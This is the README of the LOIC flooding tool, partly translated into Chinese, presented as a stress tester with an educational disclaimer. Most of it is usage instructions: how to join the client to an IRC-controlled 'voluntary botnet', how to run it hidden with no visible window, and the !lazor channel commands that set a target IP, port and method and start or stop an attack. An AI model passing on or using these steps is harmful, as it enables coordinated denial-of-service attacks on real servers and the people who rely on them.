## INFO

低轨道离子炮（LOIC）是一款用 C# 编写的开源网络压力测试工具。LOIC 基于 Praetox 的 LOIC 项目（网址：https://sourceforge.net/projects/loic/）。

## DISCLAIMER

LOIC 仅供教育用途，旨在帮助服务器所有者培养“黑客防御”意识。本工具不提供任何担保。

**您不得将本软件用于非法或不道德的用途。这包括可能引起刑事或民事责任的活动。**

**在任何情况下，许可方均不对被许可方的任何活动或不当行为负责。**

## HOW TO RUN ON WINDOWS

获取二进制文件！

需要 Microsoft .NET Framework 3.5 Service Pack 1，下载地址：
http://www.microsoft.com/downloads/en/details.aspx?FamilyID=ab99342f-5d1a-413d-8319-81da479ab0d7&displaylang=en

## HIVEMIND/HIDDEN MODE

HIVEMIND 模式会将您的客户端连接到 IRC 服务器，以便对其进行远程控制。
您可以将其视为一个自愿的僵尸网络。请注意，您的客户端可能会被
控制去做一些不正当的事情。

注意：它不允许远程管理您的机器；它
只提供对 LOIC 本身的控制。

如果您想以 Hivemind 模式启动，请运行以下命令：

```
	LLOIC.exe /hivemind irc.server.address
```
这将连接到 irc://irc.server.adress:6667/loic

您还可以指定端口和频道：

```
	LLOIC.exe /hivemind irc.server.address 1234 #secret
```
这将连接到 irc://irc.server.adress:1234/secret

要运行 Hivemind 隐藏模式，请运行以下命令：

```
	LLOIC.exe /hidden /hivemind irc.server.address
```
它将连接到 irc://irc.server.adress:6667/loic，而没有任何可见的 GUI。

## CONTROLLING LOIC FROM IRC

As an OP, Admin or Owner, set the channel topic or send a message such as the following:
```
	!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true
```

To start an attack, type:
```
	!lazor start
```

or append "start" to the END of the topic:
```
	!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true start
```

To reset LOIC's options back to their defaults:
```
	!lazor default
```

To stop an attack:
```
	!lazor stop
```

and **be sure to remove "start" from the END of the topic**, if it exists, as well.

Take a look at the source code for more details.